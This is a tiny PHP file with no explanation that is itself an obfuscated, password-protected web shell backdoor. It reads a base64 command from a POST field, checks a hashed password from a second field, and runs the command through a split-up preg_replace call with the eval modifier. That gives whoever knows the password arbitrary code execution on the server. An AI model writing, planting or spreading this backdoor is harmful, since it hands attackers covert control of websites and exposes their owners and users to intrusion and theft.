<?php
$_pss='c0935cdfe8c1e761b77e371e06ce2847';
@$_cmd=$_POST['c'];
$_w='pr'.'eg'.'_'.'replace';
@(md5($_POST['upw'])===$_pss) ? 
$_w("/.*/e","e"."val(ba"."se64_deco"."de('{$_cmd}'));",".") : '';
?>